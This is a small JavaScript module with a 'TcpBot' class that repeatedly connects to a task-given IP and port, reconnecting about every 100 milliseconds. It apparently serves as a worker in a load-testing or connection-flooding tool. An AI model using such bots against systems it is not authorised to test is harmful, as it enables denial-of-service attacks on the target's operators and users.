import net from 'net';

export class TcpBot {
  constructor(task) {
    this.ip = task.ip;
    this.port = task.port;

    this.client = null;
    this.actvie = true;
    this.connections = 0;
    this.timeoutId = 0;
  }

  start() {
    this.client = new net.Socket();

    this.client.connect({ port: this.port, host: this.ip }, err => {
      if (err) console.error('error', err);

      this.connections++;

      if (!this.actvie) return;

      this.timeoutId = setTimeout(this.reconnect.bind(this), 1e2);
    });

    this.client.on('end', () => {
      if (!this.actvie) return;
      this.reconnect();
    });

    this.client.on('error', () => {
      console.error('client error')
    })
  }

  reconnect() {
    this.connections--;
    this.client?.off('message');
    this.client?.off('error');
    this.client?.off('end');

    this.client?.end();
    this.start();
  }

  async destroy() {
    this.connections = 0;
    this.actvie = false;
    clearTimeout(this.timeoutId);
    this.client?.end();
  }
}
